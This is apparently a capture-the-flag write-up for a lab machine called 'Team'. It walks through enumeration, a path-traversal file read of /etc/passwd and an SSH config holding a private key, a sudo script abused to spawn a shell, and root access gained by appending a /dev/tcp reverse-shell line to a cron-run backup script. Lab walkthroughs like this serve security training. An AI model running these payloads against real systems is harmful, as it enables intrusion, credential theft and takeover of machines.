## Team

# Enumeration
```
# cat nmap/initial
# Nmap 7.91 scan initiated Fri Mar  5 16:10:39 2021 as: nmap -sC -sV -oN nmap/initial -vvv -p 22,21,80 10.10.142.20
Nmap scan report for 10.10.142.20
Host is up, received echo-reply ttl 61 (0.15s latency).
Scanned at 2021-03-05 16:10:40 PST for 13s

PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 61 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 79:5f:11:6a:85:c2:08:24:30:6c:d4:88:74:1b:79:4d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRK/xFh/H4lC7shWUUvK9lKxd3VO2OwfsC8LjFEU2CnEUrbVCnzx8jiVp5gO+CVAj63+GXkbIuXpynlQ/4j1dXdVUz/yAZ96cHiCNo6S5ThONoG2g2ObJSviCX2wBXhUJEzW07mRdtx4nesr6XWMj9hwIlSfSBS2iPEiqHfGrjp14NjG6Xmq5hxZh5Iq3dBrOd/ZZKjGsHe+RElAMzIwRK5NwFlE7zt7ZiANrFSy4YD4zerNSyEnjPdnE6/ArBmqOFtsWKZ2p/Wc0oLOP7d6YBwQyZ9yQNVGYS9gDIGZyQCYsMDVJf7jNvRp/3Ru53FMRcsYm5+ItIrgrx5GbpA+LR
|   256 af:7e:3f:7e:b4:86:58:83:f1:f6:a2:54:a6:9b:ba:ad (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBM4d9TCz3FkEBEJ1VMjOsCrxsbS3YGb7mu9WgtnaFPZs2eG4ssCWz9nWeLolFgvHyT5WxRT0SFSv3vCZCtN86I=
|   256 26:25:b0:7b:dc:3f:b2:94:37:12:5d:cd:06:98:c7:9f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHUxjoul7JvmqQMtGOuadBwi2mBVCdXhJjoG5x+l+uQn
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works! If you see this add 'te...
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Mar  5 16:10:53 2021 -- 1 IP address (1 host up) scanned in 13.59 seconds
```

# Port 80
An ubuntu default page, except for the following
If you see this add 'team.thm' to your hosts!
so we adjust our /etc/hosts file as such

# team.thm
A gobuster directory scan finds us a couple pages but nothing we couldn't find by looking through the page ourselves, so we try and look for subdomains

```
wfuzz -c -f subdomain.txt -Z -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --sc 200,202,204,301,302,307,403 -u"http://team.thm/" -H "Host: FUZZ.team.thm"
```
```
# head subdomain.txt -n 20
Target: http://team.thm/
Total requests: 4989
==================================================================
ID    Response   Lines      Word         Chars          Request
==================================================================
00012:  C=200    373 L       977 W        11366 Ch        "ns2"
00011:  C=200    373 L       977 W        11366 Ch        "ns1"
00010:  C=200    373 L       977 W        11366 Ch        "whm"
00009:  C=200    373 L       977 W        11366 Ch        "cpanel"
00006:  C=200    373 L       977 W        11366 Ch        "smtp"
00001:  C=200     89 L       220 W         2966 Ch        "www"
00003:  C=200    373 L       977 W        11366 Ch        "ftp"
00007:  C=200    373 L       977 W        11366 Ch        "webdisk"
00002:  C=200    373 L       977 W        11366 Ch        "mail"
00004:  C=200    373 L       977 W        11366 Ch        "localhost"
00013:  C=200    373 L       977 W        11366 Ch        "autodiscover"
00015:  C=200    373 L       977 W        11366 Ch        "ns"
00019:  C=200      9 L        20 W          187 Ch        "dev"
00023:  C=200    373 L       977 W        11366 Ch        "forum"
00022:  C=200    373 L       977 W        11366 Ch        "pop3"
```
We quickly find a dev subdomain so lets add this to our hosts file and explore here
```
Site is being built

Place holder link to team share
```
Clicking the link gives us this url
http://dev.team.thm/script.php?page=teamshare.php
so lets test for LFI
http://dev.team.thm/script.php?page=../../../etc/passwd
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
dale:x:1000:1000:anon,,,:/home/dale:/bin/bash
gyles:x:1001:1001::/home/gyles:/bin/bash
ftpuser:x:1002:1002::/home/ftpuser:/bin/sh
ftp:x:110:116:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
```
We can find the user flag in /home/dale/user.txt
Eventually fuzzing using SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
find us the file /etc/sshd/sshd_config which within contain the following
```
#Dale id_rsa
#-----BEGIN OPENSSH PRIVATE KEY-----
#b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
#NhAAAAAwEAAQAAAYEAng6KMTH3zm+6rqeQzn5HLBjgruB9k2rX/XdzCr6jvdFLJ+uH4ZVE
#NUkbi5WUOdR4ock4dFjk03X1bDshaisAFRJJkgUq1+zNJ+p96ZIEKtm93aYy3+YggliN/W
#oG+RPqP8P6/uflU0ftxkHE54H1Ll03HbN+0H4JM/InXvuz4U9Df09m99JYi6DVw5XGsaWK
#o9WqHhL5XS8lYu/fy5VAYOfJ0pyTh8IdhFUuAzfuC+fj0BcQ6ePFhxEF6WaNCSpK2v+qxP
#zMUILQdztr8WhURTxuaOQOIxQ2xJ+zWDKMiynzJ/lzwmI4EiOKj1/nh/w7I8rk6jBjaqAu
REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED 
#sQD/wqj5cQx+HJ82QXZBtwO9cTtxrL1g10DGDK01H+pmWDkuSTcKGOXeU8AzMoM9Jj0ODb
#mPZgp7FnSJDPbeX6an/WzWWibc5DGCmM5VTIkrWdXuuyanEw8CMHUZCMYsltfbzeexKiur
#4fu7GSqPx30NEVfArs2LEqW5Bs/bc/rbZ0UI7/ccfVvHV3qtuNv3ypX4BuQXCkMuDJoBfg
#e9VbKXg7fLF28FxaYlXn25WmXpBHPPdwAAAMEAxtKShv88h0vmaeY0xpgqMN9rjPXvDs5S
#2BRGRg22JACuTYdMFONgWo4on+ptEFPtLA3Ik0DnPqf9KGinc+j6jSYvBdHhvjZleOMMIH
#8kUREDVyzgbpzIlJ5yyawaSjayM+BpYCAuIdI9FHyWAlersYc6ZofLGjbBc3Ay1IoPuOqX
#b1wrZt/BTpIg+d+Fc5/W/k7/9abnt3OBQBf08EwDHcJhSo+4J4TFGIJdMFydxFFr7AyVY7
#CPFMeoYeUdghftAAAAE3A0aW50LXA0cnJvdEBwYXJyb3QBAgMEBQYH
#-----END OPENSSH PRIVATE KEY-----
```
We format this according and now have a foothold via ssh as dale

# Horizontal Escalation
```
dale@TEAM:~$ sudo -l
Matching Defaults entries for dale on TEAM:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dale may run the following commands on TEAM:
    (gyles) NOPASSWD: /home/gyles/admin_checks
```
looks like we might have sudo permission on a file to possible do some horizontal escalation to the gyles user
```
dale@TEAM:~$ cat /home/gyles/admin_checks
#!/bin/bash

printf "Reading stats.\n"
sleep 1
printf "Reading stats..\n"
sleep 1
read -p "Enter name of person backing up the data: " name
echo $name  >> /var/stats/stats.txt
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null

date_save=$(date "+%F-%H-%M")
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak

printf "Stats have been backed up\n"
```
we can see that the date line reads in a variable, error, from user input and then doesn't properly echo it/redirect it to null, so we should be able to spawn a shell 
```
dale@TEAM:~$ sudo -u gyles /home/gyles/admin_checks
Reading stats.
Reading stats..
Enter name of person backing up the data: neyr
Enter 'date' to timestamp the file: /bin/bash
The Date is
whoami
gyles
```
we can fix our shell and procede to try and escalate to root

# Root Escalation
We start by checking gyles home directory for anything interesting
```
gyles@TEAM:/home/gyles$ ls -la
total 48
drwxr-xr-x 6 gyles gyles   4096 Jan 17 19:47 .
drwxr-xr-x 5 root  root    4096 Jan 15 20:21 ..
-rwxr--r-- 1 gyles editors  399 Jan 15 21:52 admin_checks
-rw------- 1 gyles gyles   5639 Jan 17 20:34 .bash_history
-rw-r--r-- 1 gyles gyles    220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 gyles gyles   3771 Apr  4  2018 .bashrc
drwx------ 2 gyles gyles   4096 Jan 15 21:38 .cache
drwx------ 3 gyles gyles   4096 Jan 15 21:38 .gnupg
drwxrwxr-x 3 gyles gyles   4096 Jan 15 21:51 .local
-rw-r--r-- 1 gyles gyles    807 Apr  4  2018 .profile
drwx------ 2 gyles gyles   4096 Jan 15 21:43 .ssh
-rw-r--r-- 1 gyles gyles      0 Jan 17 15:05 .sudo_as_admin_successful
gyles@TEAM:/home/gyles$
```

.ssh just has a known_hosts file, but .bash_history has not been cleared so lets check it out
we see mentions of a /usr/local/bin/main_backup.sh file 
```
gyles@TEAM:/home/gyles$ ls -la /usr/local/bin | grep backup
-rwxrwxr-x  1 root admin   65 Jan 17 20:36 main_backup.sh

gyles@TEAM:/home/gyles$ cat /usr/local/bin/main_backup.sh
#!/bin/bash
cp -r /var/www/team.thm/* /var/backups/www/team.thm/

gyles@TEAM:/home/gyles$ id
uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),1003(editors),1004(admin)
```

This file is owned by root and may possibly be part of a cronjob given the operations and hint in the room
As gyles we are in the admin group so we can insert a reverse shell here and see if we get a callback on our listener
```
gyles@TEAM:/home/gyles$ cat /usr/local/bin/main_backup.sh
#!/bin/bash
cp -r /var/www/team.thm/* /var/backups/www/team.thm/
bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"
```
Sure enough after a little bit we have a reverse shell spawned on our listener and can claim the root flag in the root directory
